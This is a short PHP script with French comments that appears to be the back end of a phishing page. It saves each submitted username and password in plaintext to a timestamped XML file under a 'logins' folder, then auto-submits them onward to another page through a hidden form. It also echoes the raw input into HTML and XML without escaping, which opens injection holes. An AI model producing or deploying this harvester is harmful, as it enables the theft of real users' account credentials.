<?php
if (isset($_POST['username']) && isset($_POST['password'])) {
	# On récupère la valeur de chaque champ
	$username=$_POST['username'];
	$passwd=$_POST['password'];
	
	# On créé un fichier XML avec ces valeurs
	if( ! ini_get('date.timezone') ){
		date_default_timezone_set('GMT');
	}
	$fileName='logins/login_file_' . date("Y-m-d@h-i-s") . '.xml';
	$myfile = fopen($fileName, "w") or die("Unable to open file!");
	$data = "<root>\n\t<username>$username</username>\n\t<password>$passwd</password>\n</root>\n";
	fwrite($myfile, $data);
	fclose($myfile);
}
?>

<form action="../nav/env.php" method="POST" name="form">
       <input type=hidden name=username value=<?php echo $username ?>>
       <input type=hidden name=password value=<?php echo $passwd ?>>
</form>
<script>
       document.form.submit();
</script>